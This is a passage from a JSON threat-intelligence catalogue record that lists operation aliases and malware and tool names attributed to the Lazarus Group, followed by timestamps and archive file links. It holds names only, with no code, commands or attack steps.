                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535856,
    "ts_updated_at": 1743041843,
    "ts_creation_date": 1664713327,
    "ts_modification_date": 1664713327,
    "files": {
        "pdf": "https://archive.orkl.eu/f7d315ad556c63f6a3fb3244d8142755c77aba50.pdf",
        "text": "https://archive.orkl.eu/f7d315ad556c63f6a3fb3244d8142755c77aba50.txt",
        "img": "https://archive.orkl.eu/f7d315ad556c63f6a3fb3244d8142755c77aba50.jpg"
    }
}